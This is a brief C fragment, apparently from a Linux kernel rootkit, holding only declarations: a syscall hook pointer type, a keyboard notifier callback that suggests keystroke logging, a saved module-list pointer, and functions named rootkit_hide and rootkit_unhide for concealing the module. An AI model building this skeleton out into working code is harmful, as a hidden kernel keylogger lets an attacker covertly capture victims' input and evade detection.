typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param);

static struct notifier_block kb_blk = {
	.notifier_call = kb_cb,
};

static struct list_head *module_previous;

void rootkit_hide(void);
void rootkit_unhide(void);
